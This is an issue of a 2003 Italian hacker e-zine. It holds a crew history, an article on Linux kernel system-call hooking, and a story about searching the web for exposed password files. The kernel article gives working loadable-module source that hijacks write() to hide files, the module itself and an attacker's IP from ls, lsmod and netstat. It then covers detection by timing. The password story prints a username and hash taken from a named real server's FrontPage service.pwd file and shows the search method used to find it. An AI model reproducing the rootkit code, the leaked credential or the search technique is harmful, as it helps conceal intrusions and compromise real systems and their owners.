+-----------------------------------------------[INFORMAZIONELIBERA E-ZINE®04]-+
| Il qUiNTo nUmErO  DeLlA  E-ZiNe rIgUarDAnTe l'uNdErGRoUnD ItAlIaNo NeL MoNdO |
|------------------------------------------------------------------------------|
|                   <<<---------------------------------->>>                   |
|                   >>>     Italian Underground crew     <<<                   |
|                   <<<        INFORMAZIONELIBERA®       >>>                   |
|                   >>>     |+(ST4M>P4-UN|D3RGR0UN>D)    <<<                   |
|                   >>>            E-zine 04             <<<                   |
|                   >>>----------------------------------<<<                   |
|                                                                              |
|                   ...  combattiamo l'ignoranza informatica                   |
|                  L'HACKING NON E' UN CRIMINE! E' CONOSCENZA                  |
|                                                                              |
|+============================================================================+|
|+===================[http://www.informazionelibera.cjb.net]==================+|
|+===================[ mailto: cyberdudeIL@libero.it       ]==================+|
|+============================================================================+|
|-[LEGALE DISCLAIMER]----------------------------------------------------------| 
|Nota bene: Informazionelibera non si riterrà responsabile di eventuali  danni | 
|provocati dal cattivo utilizzo delle notizie presenti in questa  e-zine!tutti | 
|gli articoli sono scritti a scopo  dimostrativo  con  l'intento  di  spiegare | 
|e approfondire conoscenze informatiche. Qualsiasi uso  illecito   delle  info | 
|presenti nella e-zine è responsabilità del fautore di tale inflazione         |
|------------------------------------------------------------------------------|
|-[COSTITUZIONE DELLA REPUBBLICA ITALIANA]-------------------------------------|
|Diritti e doveri dei cittadini: Rapporti civili                               |
|Articolo 21                                                                   |
|Tutti hanno  diritto di manifestare  liberamente  il proprio pensiero cone la |
|parola ,   lo  scritto   e   ogni   altro   mezzo    di   diffusione.   [...] |
+------------------------------------------------------------------------------+
|       ©Copyright Informazionelibera E-zine® 5°edizione 20 ottobre 2003       |  
+------------------------------------------------------------------------------+


+-[MENU INFORMAZIONELIBERA E-ZINE 04]------------------[numero articoli -> 32]-+
|     +.....................................................................+  |
|  +--[IL CONTESTO]------------------------------------------------------------+
|     +.....................................................................+  |
|     +...Intro Informazionelibera Story .....................(Unrelated)...+  |
|     +.....................................................................+  |
|  +--[HACKING]----------------------------------------------------------------+
|     +.....................................................................+  |
|     +...Kernel syscall hacking .............................(Evil)........+  |
|     +...Esperienze Googliane ...............................(Unrelated)...+  |
|     +...Antenne all'attacco ................................(Unrelated)...+  |
|     +...Remote Procedure Call ..............................(Unrelated)...+  |
|     +...Microsoft RPCSS DCOM Vulnerability..................(Cyberdude)...+  |
|     +...ProFTPd 1.2.7 configurazione e vulnerabilità .......(Cyberdude)...+  |
|     +...Netzero e il suo jnetz.prop ........................(Cyberdude)...+  |
|     +...Altavista e le reti aziendali.......................(Cyberdude)...+  |
|     +...Occorrono ripari al nuovo OPERATO Bill Gates .......(Cyberdude)...+  |
|     +...Nascondiamo il nostro indirizzo ip .................(Eimiar)......+  |
|     +...Sql Injection ......................................(Nemesis).....+  |
|     +...mIRC USERHOST Buffer Overflow ......................(Branton).....+  |
|     +...Esecuzione di comandi nel PHP-Nuke WebMail .........(Marsio)......+  |
|     +...ProFTPD ASCII File Remote Compromise Vulnerability .(Marsio)......+  |
|     +...Win2K HaCk bUg LoG-oN sCrEeNsaVeR ..................(Dejavu)......+  |
|     +.....................................................................+  |
|  +--[CRACKING]---------------------------------------------------------------+
|     +.....................................................................+  |
|     +...Crackare StopZilla .................................(Graftal).....+  |
|     +.....................................................................+  |
|  +--[PROGRAMMAZIONE]---------------------------------------------------------+
|     +.....................................................................+  |
|     +...Presentazione del linguaggio D .....................(Lord_Jex)....+  |
|     +...E il worm si propaga con una routin di controllo ...(Blacksword)..+  |
|     +...JAVA Programming Book vr. 1.0.0 ....................(SysOv3rrid3).+  |
|     +...Converter AScii2Binary in Turbo pascal .............(Eimiar)......+  |
|     +...Converter AScii2Number in Turbo pascal .............(Eimiar)......+  |
|     +...Corso Turbo pascal 3° parte ........................(Eimiar)......+  |
|     +...Crearsi una multichat ..............................(Unrelated)...+  |
|     +.....................................................................+  |
|  +--[SATELLITARE]------------------------------------------------------------+
|     +.....................................................................+  |  
|     +...OpenSky Resolution .................................(Un.Ta.My.)...+  |
|     +.....................................................................+  |
|  +--[SECURITY]---------------------------------------------------------------+
|     +.....................................................................+  |  
|     +...Eliminare Msblaster.exe ............................(Tailot)......+  |
|     +...W.32 Blaster e L'RPC (Remote Procedure Call) .......(LukeS.Walker)+  |
|     +...W32.Dumaru@mm ... antivirus fai da te ..............(Cyberdude)...+  |
|     +...Quando la chat diventa un pericolo .................(Cyberdude)...+  |
|     +.....................................................................+  |
|  +--[ELETTRONICA]------------------------------------------------------------+
|     +.....................................................................+  |
|     +...Le basi di elettronica .............................(^ZaSt^)......+  |
|     +...Digitale VS Analogico ..............................(Bigalex).....+  |
|     +.....................................................................+  |
|  +--[FILOSOFIA HACK]---------------------------------------------------------+
|     +.....................................................................+  |
|     +...Società consumistica,cos'è e a cosa ci sta portando.(Bigalex).....+  |
|     +.....................................................................+  |
+------------------------------------------------------------------------------+
+------------------------------------------------------------------------------+
|N.B.                                                                          |
|... alcuni articoli sono stati trattati da più autori separatamente, il  tutto|
|rende solo più approfondito  lo  studio  di  alcuni  vulnerabilità  riportando| 
|diverse soluzioni!! Buona lettura                                             |
+------------------------------------------------------------------------------+

+-[START INFORMAZIONELIBERA 04]------------------------------------------------+

+--[IL CONTESTO]---------------------------------------------------------[IL04]+
|  Titolo: Intro Informazionelibera Story                                      |
|  Autore: Unrelated                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
+------------------------------------------------------------------------------+
|  Abbiamo passato circa 6-7 mesi insieme... in tutto questo  tempo  nulla     |
|  sembrava possibile,ma tutto è stato realizzato, gli sforzi iniziali per     |
|  tener unita la crew... il modo in cui abbiamo affrontato le situazioni.     | 
|  Sono tutte cose che ci hanno fatto crescere caratterialmente.Mi ricordo     |
|  ai primordi, dopo che cyber era stato fuori dalla rete per circa 4 o  5     |
|  mesi ed io avevo fondato #thelord il  gruppo antipedofilia,  che  tempo     |
|  dopo uscì pure sul Mattino,esausto di crew dove tutti erano dei semidei     |
|  , che poi alla fine non sapevano nemmeno come usare netstat,   vedo  in     |
|  query un nick a me molto familiare, era cyberdude.  Conobbi cyber nella     |
|  nostra scuola,  a quei tempi faceva parte dei membri della defunta crew     |
|  error404  e  se  non  mi sbaglio stava già scrivendo per OndaQuadra, mi     | 
|  ricordo che mi  portò  lui  in  azzurra,  prima da me poco frequentata.     |
|  Ricordo che stavamo tutti sul canale coding ai tempi delle lezioni di C     |
|  del mitico  Kernel|3260  e  dalla rigida ma allo stesso tempo simpatica     |
|  moderazione di BrNoCrIsT, peccato che poi le lezioni in questo  storico     |
|  canale finirono e lo spodestò #programming.. Ricordo che in #coding  ci     |
|  furono importanti nomi come endsub e altri di bismark.it. Tutto  ad  un     |
|  tratto cyber mi fà ciao amico...  Io quasi incredulo dopo  che  non  lo     |
|  vedevo da un sacco di tempo  rimango ancora + sbalordito quando mi dice     |
|  che vuole fondare una crew:   io subito  gli  dico  che  gli  amici  di     |
|  thelord erano a sua disposizione ( cosa sbagliata)  perchè,  forse  per     | 
|  gelosia o per altro... per colpa della fusione tra il nascente infofree     |
|  che poi sarà informazionelibera e thelord,tutti i membri del mio canale     |
|  si staccarono, alcuni andarono a fondare addirittura altri server.. gli     |
|  unici che vennero con me furono il mitico Dejavu,     che per altro ora     |
|  collabora con noi ma ha una crew tutta sua #nsh,      che produce testi     | 
|  abbastanza buoni,   poi Luke_SkyWalker founder di hackarena e leonhack,     |
|  uno dei migliori  olimpionici  defacer di questa estate e che ora si  è     |
|  aperto pure lui un  suo server.     Dalla parte di cyberdude arrivarono     |
|  stesso in quel periedo nuovi e altrettanto validi elementi:tipo MARSIO,     |
|  Branton  e  Nemesis (Esponenti dell'uiha),   oppure  serissime  anime       | 
|  solitarie della stregua  di  IceMan,  tailot, Evil.                         | 
|  Nei primi tempi quando si entrava nel canale costantemente                  | 
|  si poteva notare nel canale un silenzio di quelli tombali:c'erano tutti     |
|  voice con un solo sop, Caligola, il nostro segrtario-buttafuori fino  a     |
|  poco tempo fa, quando per divergenze dirigenziali si è allontanato.Sono     | 
|  sicuro che infondo infondo legge ancora la nostra zine, avendo  vissuto     |
|  più di me e cyber messi insieme la vita di canale:  elaborando  quiz  e     |
|  girovagando  nei  canali  alla ricerca di un bot e nell'intendo di fare     |
|  pubblicità, con le sue paranoie nel cercare sempre di fare di più  xchè     |
|  sentiva che ancora non bastava. La statistica dei membri attivi,  della     |
|  loro frequenza in canale mi veniva passata da lui ogni settimana  o  15     | 
|  giorni sempre con novità grandiose; i membri crescevano settimana  dopo     |
|  settimana da 10 a 30 fino al picco di 43, inutile dirvi che  poi alcuni     |
|  non hanno  mantenuto la parola data. Il lavoro del  grande  Caligola  è     |
|  sulle mie spalle adesso, ma comunque lo faccio con piacere.                 |
|  Dopo la scomparsa di Caligola ho incominciato a rifare il sito che fino     |
|  ad allora per il  suo  carattere  troppo  underground  era  oggetto  di     |
|  critiche (molte volte stupide e animate da persone gonfie di  gelosia):     |
|  tra una prova e l'altra nascono i tre omini,le 3 formiche  esploratrici     |
|  simbolo del vero spirito hacker. Perchè proprio formiche e perchè  tre?     |
|  Perchè  le  formiche  cooperano assiduamente per uno scopo comune e non     |
|  hanno paura di esplorare nuovi scenari: come  un  vero  hacker  esplora     |
|  e non distrugge i server, con varie e sempre nuove tecniche. Tre per la     |
|  solita questione del numero perfetto.                Ma non sono sempre     |
|  state tutte rose e fiori; molti membri se ne sono andati via,    alcuni     | 
|  hanno rippato tutorials e sono stati cacciati,mentre altri ancora hanno     |
|  postato articoli del tipo "Come funziona Netbus?"  offendendosi  quando     |
|  non hanno visto pubblicato il loro tutorial...    altri curiosi membri,     | 
|  misteriosi scrittori usciti dal nulla, visti forse in chat  una  o  due     |
|  volte al massimo,come ad esempiio Nexus... dopo aver collaborato  anche     |
|  certe volte con  eccellenti articoli, sono scomparsi nel nulla.   Molti     |
|  altri membri e questo non glielo perdonerò mai,  ci hanno abbandonato :     |
|  tipo KoRn per seguire la carriera in giornali cartacei della stregua di     |
|  HakcerJounrnal o hackerattack,                sfruttando  ingiustamente     |
|  InformazioneLibera Crew come 1 loro trampolino di  lancio, oppure altri     |
|  che stressati dalla "relatività dell'inutile  relatività" di quello che     |
|  facciamo, hanno abbandonato la crew dicendo che non accenderanno più il     |
|  computer finchè non avranno delle idee + chiare,       tipo Lord_Jex...     |
|  kmq nel nostro gruppo ognuno è libero di fare quello che vuole,   eh...     |
|  è questo il concetto della crew!Anche noi purtroppo volendo seguire una     |
|  certa linea di serietà di produzione, abbiamo fatto delle scelte,alcune     |
|  volte abbiamo fatto bene,altre volte anche se  in  buona  fede, abbiamo     |
|  sbagliato: in proposito è nato lo "Statuto di InformazioneLibera"  dove     |
|  sono descritte tutte le regole di produzione della crew e dei diritti e     |
|  doveri dei membri... Inutile dirvi che questo progetto è  nato  free  e     |
|  morirà come è nato: tutti noi ci  auguriamo  il  più  tardi  possibile.     |
|  Per adesso in google come risultato di ricerca  siamo i  primi e questo     |
|  significa che ci vogliono bene...  ciò rende tutti noi pieni di  gioia!     |
|  Anche nella maturità potremmo comunque continuare a scrivere, non credo     |     
|  che una passione divenuti adulti e lavoratori possa venir meno...   tra     |
|  gli alti e i bassi di questi bit, che vagano per  la  rete  ci  saranno     |
|  sempre nuove persone ad alimentare InformazioneLibera.I padri fondatori     |
|  chiameranno nuovi soci e così via, finchè  esisterà  una  idea  comune,     |
|  esisterà anche informazionelibera. La  ruota  di  InformazioneLibera  è     |
|  sciolta  da  qualsiesi  legame  commerciale  ed  è  questa la sua forza     |
|  ,       perchè gira per tutti allo stesso modo! Per correttezza bisogna     |
|  ricordare  tutti  gli  altri  grandi members che si sono aggregati dopo     | 
|  l'uscita della prima e della seconda zine...  a  tutti  questi che mi è     |
|  difficile ricordare a memoria va un mio più  caloroso  abbraccio  nello     |
|  sperare che stiano sempre con noi.  Scusatemi ancora se qualcuno di voi     |
|  non è stato citato,  comunque unrelated e cyberdude sono sempre lì, nel     |
|  mezzo, pronti a porgervi un sorriso e ad  applicare il  giusto  con  il     |
|  dilettevole, voi ci sarete?                                                 |
+------------------------------------------------------------------------------+

+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Kernel syscall hacking                                              |
|  Autore: Evil                                                                |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
    Autore: [Evil]
    Titolo: Kernel syscall hacking
    Http:   www.eviltime.com
    Email:  webmaster@eviltime.com

---Sommario---------------------------------------------------------------------

    (Introduzione)
    (Cosa si intende per: syscall)
    (Uso delle chiamate di sistema)
    (Modifica)
    (La NOSTRA syscall)
    (Syscall hooking detection)
    (Conclusione)

---Introduzione-----------------------------------------------------------------

In  questo  articolo tratterò della programmazione di moduli  per  linux  kernel
serie  2.4.x,  in particolare tratterò un argmento sempre vivo nell'hacking  del
kernel,  le  syscall,  infatti  vedremo per i  più  estranei  all'argomento   di
iniziare  a  capire, cosa sono e come 'ragionano' le chiamate di sistema,  e  lo
faremo in modo approfondito e comprensibile, per arrivare infine all'hacking  di
queste  chiamate, insomma..un buon inizio per arrivare a capire come lavorano  i
nuovi kernel-based rootkit e come proteggersi da essi.

---Cosa si intende per: syscall-------------------------------------------------

  Le  syscalls  sono  le suddette "Chiamate di sistema". Più  semplicemente,  le
syscalls  sono le vie usate dai programmi in user-space per chiedere al  sistema
operativo  di fare qualcosa per il programma, ad esempio se vogliamo  vedere  la
lista  del contenuto di una directory, scriveremo nella console il comando 'ls',
questo  programma,  contenuto  in forma binaria nella  dir  /usr/bin/,  andrà  a
chiamare  una  syscall,  in questo caso la getdents,  che  andrà  a  listare  il
contenuto  della  directory  attuale (se non specificata).  Queste  chiamate  di
sistema,  possono  essere  già  implementate nel kernel,  oppure  risiedenti  in
qualche  LKM, (ed è proprio con quest'ultima opportunità, che si possono hackare
le  syscall). In linux come in tutti gli altri sistemi operativi le syscall sono
implementate  attraverso  altre chiamate con un interrupt,  e  in  linux  questo
interrupt  (mascherato), è $0x80, 'int $0x80', e quando  questa  funzione  viene
eseguita  il controllo del tutto viene dato ad una funzione del kernel  chiamata
_system_call()  che a sua volta chiamerà ret_from_sys_call() per controllare  le
attività in processo, per poi infine tornare allo user-space. In linux  tutti  i
registri  vengono salvati, e quello che interessa a noi ovvero il registro  %eax
viene  controllato da un interessante tabella, dove  archiviate tutte le syscall
e  i loro indirizzi, ovvero la sys_call_table[],dove ogni indirizzo di memoria e
ogni  numero,  corrisponde  ad  una determinata syscall  per  richiamare  questa
tabella è necessario dichiarare la variabile esterna con la stringa:

 extern void *sys_call_table[];

  per  gli  interessati, i numeri identificativi delle chiamate  di  sistema  si
possono  trovare, /usr/include/sys/syscall.h . se in un programma  provassimo  a
cercare  di  chiamare un numero di syscall non esistente, riceveremo  un  errore
quale "Function not implemented". perchè la syscall chiamata non esiste e quindi
non è implementata o un errore di tipo "Bad address", per testare il tutto,basta
provare  a  chiamare  in  un  prog  in C il numero  di  syscall  1337  (per  ora
inesistente) in questo modo:

    __asm__("movl $1337,%eax
             int $0x80"); // ricordate 'int $0x80'

  E  usando il perror() riferito a questa funzione, verrà restituito un  errore,
riferito all'incorrettezza del numero della chiamata di sistema.

---Uso delle chiamate di sistema------------------------------------------------

  L'uso delle syscall in un lkm, è molto più facile di quanto si possa credere e
credo  che  sia più difficile spiegarlo che metterlo in pratica.  ad  ogni  modo
prima di tutto per usarle, serve richiamare una void esterna

 extern void *sys_call_table[];

  poi bisogna dichiarare la syscall originale, e quindi copiare l'indirizzamento
della  syscall  usando nome_sys=sys_call_table[__NR_getuid]; lo  so  non  è  una
spiegazione  cosi  esaudiente, ad ogni modo vi lascio un code comprensibile  qui
sotto, e nella prossima lezione passeremo all'hacking delle syscall. ho usato la
getuid, perchè è la più usata e la più adatta per questo tipo di esempi.

 /* example of getuid */

 #define __KERNEL__
 #define MODULE

 #include <linux/kernel.h>
 #include <linux/module.h>

 /* necessarie per l'uso di uid_t e per la funzione di reindirizzamento */
 #include <sys/types.h>
 #include <asm/unistd.h>

 extern void *sys_call_table[];

 uid_t (*o_getuid)();

 int init_module() {
   uid_t uid;
   o_getuid=sys_call_table[__NR_getuid];
   uid=(*o_getuid)();
   printk("uid = %i\n", (int)uid);
   return(0);
 }

 void cleanup_module() {
   printk("unloaded\n");
 }

---Syscall hooking--------------------------------------------------------------

  Dunque,  "hooking",questa parola risulterà a molti ancora sconosciuta,  questo
termine  è  traducibile in italiano come "Agganciare", ed è un pò  l'azione  che
riguarda  questa  tecnica, ovvero agganciare una syscall.  Il  corpo  di  questa
tecnica  sta  nel modificare il comportamento di una funzione,   una  syscall  a
nostra  scelta insomma, ed è la tecnica più semplice in assoluto, ma veniamo  al
dunque, mostrandovi l'hooking della write(2) in un semplice modulo:

 /*
  * this is a lkm, that hacks the 'write()' syscall
  * it works on kernel 2.4, and i've tested it in a kernel-2.4.18
  * use it in every mode, but pay more attention, it can be dangerous.
  * in simple words, don't lame it
  * remember, change the defines!, it's for your security..
  *
  * compile it with: gcc -O6 -c mjdwsys.c
  * run it with: insmod mjdwsys.o
  *
  */

#define MODULE
#define __KERNEL__

#include <linux/malloc.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

#define IPHIDE "127.0.0.2" // change it!
#define LKMHIDE "mjdwsys" // change!
#define FILEHIDE "somefile" // change it!
#define FAKEIP "127.0.0.1"

unsigned char aip[1024]=IPHIDE;
unsigned char lkms[1024]=LKMHIDE;
unsigned char file[1024]=FILEHIDE;
unsigned char fake_aip[1024]=FAKEIP;

int sysout;

extern void *sys_call_table[];

int (*original_write)(u_int fd,u_char *buf,u_int count); // original write()
syscall

int hacked_write(u_int fd,u_char *buf,u_int count) // my own hacked syscall
{
   char *var;
   char *kbuf=(char*)kmalloc(256,GFP_KERNEL);

   copy_from_user(kbuf,buf,255); // user-space 2 kernel_space

   if(!(strcmp(current->comm,"ls"))||
      !(strcmp(current->comm,"dir")))
   {
       if(strstr(kbuf,file)) {
           kfree(kbuf);
           return -ENOENT;
       }
   }

   if(!(strcmp(current->comm,"lsmod")))
   {
       if(strstr(kbuf,lkms)) {
           kfree(kbuf);
           return -ENOENT;
       }
   }

   if(!(strcmp(current->comm,"netstat"))||
      !(strcmp(current->comm,"finger"))||
      !(strcmp(current->comm,"lastlog")))
   {
      if((var=strstr(kbuf,aip))!=NULL) // check for our ip
          {
            strncpy(var,fake_aip,strlen(fake_aip)); // i repeat, im not here :)
            copy_to_user(buf,kbuf,255); // kernel-space 2 user-space
            kfree(kbuf);
            return 0;
          }
   }

   kfree(kbuf); // i wanna be free
   sysout=(*original_write)(fd,buf,count); // calculating the real gived return
   return sysout;
}

int init_module(void)
{
    original_write=sys_call_table[SYS_write]; // saving the original syscall
    sys_call_table[SYS_write]=hacked_write; // eheh

    return 0;
}

void cleanup_module(void)
{
    sys_call_table[SYS_write]=original_write;
}


 -EOF-

  Nulla  di nuovo ovviamente, ma esaminiamo bene uello che si è fatto. Guardando
più  a  fondo il codice sovrastante, possiamo trarne fuori 2 regole estremamente
importanti nel praticare un hooking:

 int (*original_write)(u_int fd,u_char *buf,u_int count);

 int hacked_write(u_int fd,u_char *buf,u_int count) {

  Nella  prima  riga, subito dopo la dichiarazione della syscall_table,  abbiamo
dichiarato  il  nome  della vera syscall della write(2), e subito  dopo  abbiamo
invece  dichiarato  una nuova funzione "hacked_write" che come  possiamo  vedere
nell'init,  andrà  a  sostituire la funzione della vecchia write()  e  quindi  a
modificarne in parte il comportamento

    original_write=sys_call_table[SYS_write]; // saving the original syscall
    sys_call_table[SYS_write]=hacked_write; // eheh

 ovviamente prima di andare a sostituirla, "IMPORTANTE" facciamo un backup della
vecchia  syscall in modo da non fare danni permanenti al nostro kernel..  Questo
esempio  permette  di  nascondere  a comandi come  'netstat'  ecc..  determinate
stringhe, che possono essere il vostro ip, il vostro host, un file di sistema...
Ma  ovviamente  è un metodo 'stupido', poichè verrebbe scoperta  a  distanza  di
pochi  giorni.. quindi inutile dal punto di vista pratico ma pur sempre un  buon
metodo di studio.

---La NOSTRA syscall------------------------------------------------------------

  Dopo  aver  visto  Uso,  hooking, e la sostituzione di una  syscall,  possiamo
finalmente parlare di come, aggiungere nel vero senso della parola, delle NOSTRE
Syscall.  Per farlo bisogna prima di tutto aggiungere delle informazioni  su  di
essa nel file "include/asm-i386/unistd.h" (i386 sostituibile..), la sintassi del
#define richiesto è questa:

 #define __NR_<syscall>  <num>

 quindi supponiamo di volere aggiungere la syscall 'trivk'

 #define __NR_trivk 132

e  andrà  messo  in  ordine  crescente a seconda del numero  della  syscall  che
assegnamo   il   secondo   passaggio,   è   l'aggiunta   di   un   simbolo    in
arch/i386/kernel/entry.S :

 .long SYMBOL_NAME(sys_trivk)

  anche  qui  in ordine crescente, basandosi sul numero assegnato in  precedenza
infine  aggiungiamo  a  fs/read_write.c questa parte  di  code  esemplificativo:
(tengo  a  precisare che è la scelta appropriata per l'esempio l'uso del  .c  di
read()  & write(), sta a voi poi trovare il posto giusto dove schiaffeggiare  la
parte di code interessata)

 /* trivial data structure example read() & write() impl */

 struct trivial_t
 {
   int  number;
   long bignum;
 } trivial;


asmlinkage long sys_foobar( struct trivial_t *buf )
{

  if( (copy_to_user( buf, &trivial, sizeof( trivial ) )) != 0 )
    return -1;

  return 0;

}

 -EOF-

  Ora la nostra syscall è pronta per l'uso, non farà altro che copiare la trival
struct del kernel, in userland e assumere valore di ritorno -1 su fallimento e 0
su  successo. Ammetto di aver superficializzato l'argomento in questione, ma più
in basso rilascierò riferimenti e link utili allo studio approfondito.

---Syscall hooking detection----------------------------------------------------

  Dopo  la  pratica di attacco, possiamo analizzare la pratica difensiva  ovvero
come 'scovare' le syscall hookate e riconoscerle da quelle 'naturali'.

  Ci  sono  veramente  molti  modi per il detecting,  ma  riconosco  che  i  più
importanti sono come prima cosa, il testing manuale, ovvero, provare un  listing
dei mod  presenti e cercarne di sospetti, questo usando 'lsmod'.  Questo però ha
un suo contro, difatti se l'attacker, ha hookato la syscall richiamata da lsmod,
ovvero  la  getdents(2),  cè  il  pericolo,  anzi  la  certezza  di  non  potere
visualizzare  gli  lkm  interessati.. Quindi si può passare  ad  un  metodo  più
recente,  chiamato  da  xenion Syscall benchmark, che consiste  nel  testare  le
'funzionalità'  di una syscall, basandosi non sul rendimento e le  potenzialità,
come succede per i benchmark di schede audio, video ecc... ma semplicemente  sul
tempo,  di  riuscita  della  syscall,  si  riconosce  infatti  che  una  syscall
hookata,avrà  sempre  un tempo di riuscita maggiore di una normale  syscall.  Ho
trovato  questo  metodo su BFI-dev-09, scritto da xenion,  vi  listo  dunque  il
programma:

 /*
 * ---------------------------------------------------------------------------
 * No part of this project may be used to break the law, or to cause damage of
 * any kind. And I'm not responsible for anything you do with it.
 * ---------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
 * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
 * you can do whatever you want with this stuff. If we meet some day, and you
 * think this stuff is worth it, you can buy me a beer in return.
 * xenion ~ Dallachiesa Michele
 * ---------------------------------------------------------------------------
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/times.h>

#define BUF "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

int
main(int argc, char **argv)
{
    struct tms      start,
                    end;
    unsigned long   loop;

    if (argc < 2) {
    printf
        ("Measures the amount of CPU time spent executing a write(2)
loop.\n");
    printf("(may be used to detect a possible write syscall hook)\n");
    printf("usage: %s <times to loop>\n\n", argv[0]);
    exit(0);
    }

    loop = atol(argv[1]);

    printf("loop %ld times\n", loop);

    times(&start);

    while (loop--)
    write(3, BUF, sizeof BUF);

    times(&end);

    printf("Execution time: %ld jiffies.\n",
       (end.tms_utime - start.tms_utime) + (end.tms_stime -
                        start.tms_stime));

    return 0;

}

 -EOF-

  Compiliamo dunque il programma, e testiamo la syscall write, provandola  prima
da originale:

 # ./wbench 1000000
 loop 1000000 times
 Execution time: 112 jiffies.

 e poi dopo aver fatto partire il famoso adore dei teso

 # cd adore/
 # ./startadore
 # ./wbench 1000000
 loop 1000000 times
 Execution time: 132 jiffies.
 #

 in modo molto evidente la riuscita della syscall hookata risulta impiegare  una
quantita  maggiore  relativamente  a quella  normale.  Un  ultimo  metodo  molto
importante è l'uso di 'chkrootkit' che usa questi metodi più altri metodi sempre
molto  aggiornati, per riconoscere una vasta lista di rootkit, compreso  l'adore
dei  teso,  potete  downloaddare il programma direttamente  dal  sito  ufficiale
www.chkrootkit.org, o dal mio sito www.eviltime.com

---Conclusione------------------------------------------------------------------

  E  così posso chiudere questo tutorial, spero di essere stato chiaro per tutti
ed  esaudiente  per  i  più interessati, potete comunque  per  qualsiasi  motivo
mandarmi una e-mail a webmaster@eviltime.com, e per maggiori informazioni o  per
trovare  altro  mio  materiale, potete visitare il mio sito www.eviltime.com  Vi
lascio quindi la promessa lista di Links e references:

 http://www.s0ftpj.org/bfi/dev/BFi11-dev-09
 file://The linux kernel programming HOWTO
 http://www.linuxdoc.org/LDP/khg/HyperNews/get/khg.html
 http://www.lisoleg.net/doc/Kernel-Hacking-HOWTO/kernel-hacking-HOWTO.html

 Inoltre la sempre utile guida dei THC, raggiungibile dal sito: www.thc.org
 Fine.




+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Esperienze Googliane                                                |
|  Autore: Unrelated                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+

¢•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
.....•
....•
....•
..•
...•
......•
........•
........•
.........
.........•...•
.....•.••
...........
......•.............
........•.••.............
....••••••••...••••••••...............  Esperienze    Googliane ........
....•.••••••.•••••......................................................
..••••••••••••••••............          Lord Unrelated Lodeguns ........
••••••••.••••••••••.....................................................
..................................      24 Settembre 2003 20.29 ........

 Ora con  questo tutor, forse  un  pò  campato in aria, per una serie di 
 combinazioni di elementi, vorrei  raccontare  l'esperienza  che   mi  è
 capitata  quasi per caso ma  che  mi  ha  dato  dei  frutti  abbastanza
 ehm... come dire gustabili... forse...  boh lascio a voi il giudizio se
 quello che vi dirò suona bene.. se no perdonate la mia ignoranza...  :D
 Kmq bando alle chance di configurazione dei vostri neuroni inceppati  e 
 iniziamo... era un pomeriggio di merda dopo circa un ora di  matematica
 circonferenze goniometriche e il seno il cosino... e alre cosine non ci
 capivo + niente...  quindi  invece  di  andarmi  a  leggere  la  teoria
 incomincio a cazzeggiare in giro per la  rete e  mentre  cerco  qualche
 sito da vedere, qualche immagine da scaricare..  qualcosina inzomma per 
 evitare di addormentarmi... vedo una cosina che mi manda <nnvuoldirkiè>

 <nnvuoledirkiè> ciao unre
 <unrelated> ciao
 <nnvuoldirkiè> http://hercules.ifsi.rm.cnr.it/meeting/HIFI/_vti_pvt/service.pwd
 <unrelated> c stai
 No such nick/channel
 -> *MemoServ* SEND nonvuoledirechiè ma lo hai già aperto? il service... kmq grazie ora
 vedo che ci sta :D
 Session Close: Mon Sep 22 18:30:06 2003
 
 a  primo impatto ho creduto... caz ora mi prendo un'altro green così se
 mi cade questo sto sicuro che ne ho un  altro... apro l'url e vedo
 scritto questo:
 
                               # -FrontPage-
                               erina:7KjDgaafMfI5k

 
 deh hi he he doh... dico sta roba sarà una pass.. controllo il  server
 utilizzando il bot di leonhack:
 
 <unrelated> !server hercules.ifsi.rm.cnr.it
 <leonhack_Bot> unrelated: hercules.ifsi.rm.cnr.it web server returns
                SERVER header Apache/1.3.22 (Unix)  mod_perl/1.25
 <unrelated> ok

 hihih comodo così vero? kmq per adesso tutto nella  normalità sappiamo
 che un sito hostato su un apache viene gestito da un admin  ubriaco...
 capita..  purtroppo nessuno  è  perfetto ma... e  dovete stare attenti
 quando dico ma...  se io  potessi  fare una ricerca  dei server.pwd di
 questo genere? ecco che come quel cartone animato che fanno prima  dei
 simpson; gioco la carta all'apparenza + stupida ma come sempre  fatale
 apro google... molti diranno_ << nooooo non farlo... fino ad adesso il
 tu-torial stava andado bene>>. Kmq semplicemente cerco  su  google  il
 file imputato...

 hercules.ifsi.rm.cnr.it servce.pwd 
 
 ma  sbaglio omettendo la i... hihihi e il caro vecchio amico gugul  mi
 dice:

 Forse cercavi ...: hercules.ifsi.rm.cnr.it service.pwd

 hihi  ma come ha fatto a indovinare...poi dicono che nn lo devo  amare
 sto motore di recerc...  quindi carinamente lievemente pigio sull' url
 e cosa mi esce????
 
 La ricerca di - link:9-uORGe00xoJ:hercules.ifsi.rm.cnr.it service.pwd-
 non ha prodotto risultati in  nessun documento.  Nessuna delle  pagine 
 cercate contiene "uorge00xoj".

 ma cos'è uorge00xoj? boh.. ipotizzo che google abbia bucato per me il
 server decodificando la pass.. interrogando il server...  ma pensando
 a un bug interno credo semplicemente che sia stata una  trasposizione
 errata del link dal forse cercavi alla casella di ricerca di google..

 quindi procedo a cancellare quei numeri e cerco finalemente:
 
 hercules.ifsi.rm.cnr.it service.pwd   

 intanto  ho creduto mi darà un errore della minkia ed  ho  perso solo
 tempo... ma...  e questa volta dico doppio ma... dopo esssermi  quasi
 affogato dal mare di  risatine maligne, che  trovo  dinanzi  ai  miei
 increduli occhi=?

 1) L'ACCESSO AL SERVER 
 2000.10.30 11:51 BC:\Documenti\WEB_creat\public_html\meeting\ ... - [ Traduci questa pagina ]
 ... home/ir/public_html/meeting/HIFI/_vti_pvt service.grp 2000.10.30 11:51     BC:\Documenti\WEB_creat\public_html\meeting\HIFI\_vti_pvt\service.pwd
